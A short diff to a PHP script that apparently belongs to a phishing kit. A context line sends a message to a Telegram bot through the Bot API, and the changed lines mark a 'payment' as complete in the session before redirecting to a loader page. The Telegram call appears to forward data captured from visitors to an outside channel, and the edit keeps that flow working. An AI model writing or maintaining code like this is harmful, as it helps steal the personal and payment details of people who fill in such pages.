@@ -24,5 +24,8 @@
         file_get_contents("https://api.telegram.org/bot$token/sendMessage?".http_build_query(['text' => $message,'chat_id' => $chat_id]));
     }
 
-    header("Location: ../loader.php?r=finished?t=4000"); die();
+    // Mark payment as complete
+    $_SESSION['payment_complete'] = true;
+    header("Location: ../loader.php?r=finished?t=4000");
+    exit();
 ?>
